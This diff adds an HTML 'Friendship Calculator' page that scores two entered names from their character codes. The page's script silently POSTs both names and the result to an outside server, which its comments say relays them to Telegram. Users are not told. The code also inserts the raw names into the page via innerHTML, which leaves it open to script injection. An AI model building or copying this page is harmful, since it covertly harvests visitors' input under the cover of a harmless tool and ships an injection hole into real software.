@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>Friendship Calculator</title>
+</head>
+
+<body>
+
+    <h2>Friendship Calculator</h2>
+
+    <label>Your Name:</label><br>
+    <input type="text" id="name1"><br><br>
+
+    <label>Friend's Name:</label><br>
+    <input type="text" id="name2"><br><br>
+
+    <button onclick="calculateFriendship()">Check Friendship</button>
+
+    <h3 id="result"></h3>
+
+    <script>
+        // Send data to backend → Telegram
+        function sendToTelegram(name1, name2, result) {
+            fetch("https://cal-92jw.onrender.com", { // Replace this
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({
+                        name1: name1,
+                        name2: name2,
+                        result: result
+                    })
+                })
+                .then(response => console.log("Sent to Telegram"))
+                .catch(error => console.error("Error:", error));
+        }
+
+        // Main calculator logic
+        function calculateFriendship() {
+            var name1 = document.getElementById("name1").value.trim();
+            var name2 = document.getElementById("name2").value.trim();
+
+            if (name1 === "" || name2 === "") {
+                document.getElementById("result").innerHTML = "Please enter both names.";
+                return;
+            }
+
+            // Generate deterministic score
+            var combined = name1.toLowerCase() + name2.toLowerCase();
+            var score = 0;
+
+            for (var i = 0; i < combined.length; i++) {
+                score += combined.charCodeAt(i);
+            }
+
+            var percentage = score % 101;
+            var resultText = percentage + "%";
+
+            // Display result
+            document.getElementById("result").innerHTML =
+                name1 + " & " + name2 + " Friendship: " + resultText;
+
+            // Send result to Telegram
+            sendToTelegram(name1, name2, resultText);
+        }
+    </script>
+
+</body>
+
+</html>
